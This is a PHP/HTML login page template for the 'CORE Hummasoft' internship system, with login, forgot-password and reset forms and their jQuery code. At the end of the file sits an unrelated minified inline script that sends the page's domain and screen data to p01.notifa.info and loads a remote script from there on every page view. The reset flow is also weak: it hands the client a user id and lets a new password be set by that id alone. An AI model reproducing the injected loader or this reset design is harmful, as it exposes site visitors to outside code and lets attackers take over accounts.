

<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="utf-8" />
        <title>Magang - Hummasoft</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta content="width=device-width, initial-scale=1" name="viewport" />

        <!-- BEGIN GLOBAL MANDATORY STYLES -->
        <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&subset=all" rel="stylesheet" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/login/global/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/login/global/plugins/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/login/global/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/login/global/plugins/bootstrap-switch/css/bootstrap-switch.min.css" rel="stylesheet" type="text/css" />
        <!-- END GLOBAL MANDATORY STYLES -->
        <!-- BEGIN THEME GLOBAL STYLES -->
        <link href="<?php echo base_url(); ?>assets/login/global/css/components.min.css" rel="stylesheet" id="style_components" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/login/global/css/plugins.min.css" rel="stylesheet" type="text/css" />
        <!-- END THEME GLOBAL STYLES -->
        <!-- BEGIN PAGE LEVEL STYLES -->
        <link href="<?php echo base_url(); ?>assets/login/pages/css/login-5.min.css" rel="stylesheet" type="text/css" />
        <link href="<?php echo base_url(); ?>assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@8/dist/sweetalert2.min.css">
        <!-- END PAGE LEVEL STYLES -->
        <!-- BEGIN THEME LAYOUT STYLES -->
        <!-- END THEME LAYOUT STYLES -->
        <link rel="shortcut icon" href="favicon.ico" />

        <style type="text/css">
            .swal2-popup {
              font-size: 1.3rem !important;
            }
        </style>
    </head>
    <!-- END HEAD -->

    <body class=" login">
        <!-- BEGIN : LOGIN PAGE 5-1 -->
        <div class="user-login-5">
            <div class="row bs-reset">
                <div class="col-md-6 bs-reset mt-login-5-bsfix">
                    <div class="login-bg" style="background-image:url(<?php echo base_url(); ?>assets/login/pages/img/login/1.jpg)">
                        </div>
                </div>
                <div class="col-md-6 login-container bs-reset mt-login-5-bsfix">
                    <div class="col-md-12">
                        <img class="login-logo" src="<?php echo base_url(); ?>assets/login/pages/img/login/magang1.png" style="width:200px"/> 
                    </div>
                    <div class="login-content">
                        <h1>CORE Hummasoft </h1>
                        <p> Selamat datang di Hummasoft , silahkan login terlebih dahulu sebelum melanjutkan ke halaman dasboard . </p>
                        <?php if($cekAdmin){ 
                        
                     }
                    else{ ?>
                        <p>Belum Punya Akun? <a href="<?php echo base_url('register')?>" class="btn-link mar-rgt text-bold">Daftar</a></p>
                   <?php } ?>
                        <form action="<?php echo base_url('login/proses_login' ) ?>" class="login-form" method="post">
                            <div class="alert alert-danger display-hide">
                                <button class="close" data-close="alert"></button>
                                <span>Harap masukan Username dan Password. </span>

                            </div>
                            <div class="row">
                                <div class="col-xs-6">
                                    <input class="form-control form-control-solid placeholder-no-fix form-group" type="text" autocomplete="off" placeholder="Masukan Username" name="username" required/> </div>
                                <div class="col-xs-6">
                                    <input class="form-control form-control-solid placeholder-no-fix form-group" type="password" autocomplete="off" placeholder="Masukan Password" name="password" required/> </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-4">
                                    
                                </div>
                                <div class="col-sm-8 text-right">
                                    <div class="forgot-password">
                                        <a href="javascript:;" id="forget-password" class="forget-password">Lupa Password?</a>
                                    </div>
                                    <button class="btn green" type="submit">Masuk</button>
                                </div>
                            </div>
                        </form>
                        <!-- BEGIN FORGOT PASSWORD FORM -->
                        <form class="forget-form" action="javascript:;" method="post">
                            <h3 class="font-green">Lupa Password ?</h3>
                            <p id="pemberitahuan"> Masukkan data anda. </p>
                             <p id="pemberitahuan2"> Anda Bukan Direktur / Admin Perusahaan. </p>
                            <div class="form-group">
                                <input class="form-control placeholder-no-fix form-group" id="username" type="text" autocomplete="off" placeholder="Username" name="username" /> 
                            </div>
                            <div class="form-group">
                                <input class="form-control placeholder-no-fix form-group" id="email" type="text" autocomplete="off" placeholder="Email" name="email" /> 
                            </div>
                            <div class="form-group">
                                <input class="form-control placeholder-no-fix form-group" id="no_telp" type="text" autocomplete="off" placeholder="No Telepon" name="no_telp" /> 
                            </div>
                            <div class="form-actions">
                                <button type="button" id="back-btn" class="btn green btn-outline">Back</button>
                                <button type="submit" class="btn btn-success uppercase pull-right" id="submit">Submit</button>
                            </div>
                        </form>
                        <!-- END FORGOT PASSWORD FORM -->

                        <!-- NEW PASSWORD -->
                        <form class="new-password" action="javascript:;" method="post">
                            <h3 class="font-green">Lupa Password ?</h3>
                            <p id="pemberitahuan3"> Masukkan password baru. </p>
                            <p id="pemberitahuan4"> Password tidak sesuai. </p>
                            <div class="form-group">
                                <input class="form-control placeholder-no-fix form-group" name="id" id="idUser"  type="hidden" autocomplete="off" /> 
                                <input class="form-control placeholder-no-fix form-group" id="passwordBaru" type="password" autocomplete="off" placeholder="Password" name="password" /> 
                            </div>
                            <div class="form-group">
                                <input class="form-control placeholder-no-fix form-group" id="passwordKonf"  type="password" autocomplete="off" placeholder="Konfirmasi Password" name="konf_password" /> 
                            </div>
                           
                            <div class="form-actions">
                                <button type="button" id="back-btn2" class="btn green btn-outline">Back</button>
                                <button type="submit" class="btn btn-success uppercase pull-right" id="submit2">Submit</button>
                            </div>
                        </form>
                        <!-- END NEW PASSWORD -->

                    </div>
                    
                </div>
            </div>
        </div>
        <!-- END : LOGIN PAGE 5-1 -->
        <!--[if lt IE 9]>
<script src="../assets/global/plugins/respond.min.js"></script>
<script src="../assets/global/plugins/excanvas.min.js"></script>
<script src="../assets/global/plugins/ie8.fix.min.js"></script>
<![endif]-->
        <!-- BEGIN CORE PLUGINS -->
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/jquery.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/js.cookie.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/jquery-slimscroll/jquery.slimscroll.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/jquery.blockui.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/bootstrap-switch/js/bootstrap-switch.min.js" type="text/javascript"></script>
        <!-- END CORE PLUGINS -->
        <!-- BEGIN PAGE LEVEL PLUGINS -->
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/jquery-validation/js/jquery.validate.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/jquery-validation/js/additional-methods.min.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>assets/login/global/plugins/backstretch/jquery.backstretch.min.js" type="text/javascript"></script>
        <!-- END PAGE LEVEL PLUGINS -->
        <!-- BEGIN THEME GLOBAL SCRIPTS -->
        <script src="<?php echo base_url(); ?>assets/login/global/scripts/app.min.js" type="text/javascript"></script>
        <!-- END THEME GLOBAL SCRIPTS -->
        <!-- BEGIN PAGE LEVEL SCRIPTS -->
        <script type="text/javascript">
            var Login = function() {

            var handleLogin = function() {

                $('.login-form').validate({
                    errorElement: 'span', //default input error message container
                    errorClass: 'help-block', // default input error message class
                    focusInvalid: false, // do not focus the last invalid input
                    rules: {
                        nama: {
                            required: true
                        },
                        nis: {
                            required: true
                        },
                        remember: {
                            required: false
                        }
                    },

                    messages: {
                        nama: {
                            required: "Nama is required."
                        },
                        nis: {
                            required: "NIS is required."
                        }
                    },

                    invalidHandler: function(event, validator) { //display error alert on form submit
                        $('.alert-danger', $('.login-form')).show();
                    },

                    highlight: function(element) { // hightlight error inputs
                        $(element)
                            .closest('.form-group').addClass('has-error'); // set error class to the control group
                    },

                    success: function(label) {
                        label.closest('.form-group').removeClass('has-error');
                        label.remove();
                    },

                    errorPlacement: function(error, element) {
                        error.insertAfter(element.closest('.input-icon'));
                    },

                    submitHandler: function(form) {
                        form.submit(); // form validation success, call ajax form submit
                    }
                });

                $('.login-form input').keypress(function(e) {
                    if (e.which == 13) {
                        if ($('.login-form').validate().form()) {
                            $('.login-form').submit(); //form validation success, call ajax form submit
                        }
                        return false;
                    }
                });

                $('.forget-form input').keypress(function(e) {
                    if (e.which == 13) {
                        if ($('.forget-form').validate().form()) {
                            $('.forget-form').submit();
                        }
                        return false;
                    }
                });

                $('#forget-password').click(function(){
                    $('.login-form').hide();
                    $('.forget-form').show();
                    $('.new-password').hide();
                    $('#pemberitahuan2').hide();
                });

                $('#back-btn').click(function(){
                    $('.login-form').show();
                    $('.forget-form').hide();
                    $('.new-password').hide();
                });

                $('#back-btn2').click(function(){
                    $('.login-form').hide();
                    $('.forget-form').show();
                    $('.new-password').hide();
                });
            }




            return {
                //main function to initiate the module
                init: function() {

                    handleLogin();

                    // init background slide images
                    $('.login-bg').backstretch([
                        "<?php echo base_url(); ?>assets/login/pages/img/login/1.jpg",
                        "<?php echo base_url(); ?>assets/login/pages/img/login/2.jpg",
                        "<?php echo base_url(); ?>assets/login/pages/img/login/3.jpg",
                        "<?php echo base_url(); ?>assets/login/pages/img/login/4.jpg",
                        "<?php echo base_url(); ?>assets/login/pages/img/login/5.jpg"
                        ], {
                          fade: 1000,
                          duration: 5000
                        }
                    );

                    $('.forget-form').hide();
                    $('.new-password').hide();
                }

            };

        }();

        $('#submit').on('click',function(){
            var username = $('#username').val();
            var email    = $('#email').val();
            var no_telp  = $('#no_telp').val();
            

            $.ajax({
                type        : 'POST',
                url         : '<?php echo site_url('login/lupaPassword') ?>',
                data        : {username:username, email:email, no_telp:no_telp},
                dataType    : 'JSON',
                success     : function(e){

                    $('#idUser').val(e);

                    $('.login-form').hide();
                    $('.forget-form').hide();
                    $('.new-password').show();

                    $('#pemberitahuan4').hide();
                }

            });
            $('#pemberitahuan').hide();
            $('#pemberitahuan2').show();
        });

        $('#submit2').on('click',function(){
           // alert("ss");
            var password        = $('#passwordBaru').val();
            var konf_password   = $('#passwordKonf').val();
            var id              = $('#idUser').val();
           // alert(id);
                
            if(password == konf_password){

                $.ajax({
                    type        : 'POST',
                    url         : '<?php echo site_url('login/passwordBaru') ?>',
                    data        : {id:id, password:password},
                    dataType    : 'JSON',
                    success     : function(){

                        window.location.assign('<?php echo base_url('login') ?>');
                    }

                });
            }else{
                $('#pemberitahuan3').hide();
                $('#pemberitahuan4').show();
            }
            
            
        });

        jQuery(document).ready(function() {
            Login.init();
        });
        </script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.all.min.js"></script>

                <!-- END PAGE LEVEL SCRIPTS -->
        <!-- BEGIN THEME LAYOUT SCRIPTS -->
        <!-- END THEME LAYOUT SCRIPTS -->
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAj8CpqLjy%2bITT9lUu95vhy94vzTW%2bgF%2f7zjNUN5dGZkhgSNUND1WTR7Fl87v0HntTWAz0CPcoLjXCQbm2XzoWxcOZD2EqpKfKUEZxn57x7yplbu8gXkMjaLEJqQToaI9MaY5%2bz9muC%2bD2A8%2fHAeaRUQhhvDgB58iWlaajqSxfWPvsSwpu0fy6IS0psz%2bRoy2jmT4Tk5WdTQw6xcK5jOCkonfmgXLcZDZ4iczIk%2bDR6Ww4zuAc3tnaJ8bsb2A%2f7hU0yBhrqhJTxeqsTq66ge5idxVj%2fiagl9CbiVV8uwWU0wrurmlGB7%2beKOR90oYRGy%2fYnycK3DClJhAkzyPg0vXm5m%2b288MIPbeJtUSUCjp4zpHeUME2Qn2gYBvX%2fiGbIhMJDwBnHInO49PI1gPtz9Y70yv5mspYyrU3IN%2f22WA6Rx5dy0vmnTrBtSe2QrPqx8z7jKZBGvi0FUnp3PFUcEUl76UZrkte40A5SZlt8OlkV1sYpwsyHMOH%2bXYwKyz%2baSFw0PDCbHWFr67YpV8q%2b2YHaOjf8jWUb1%2fk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
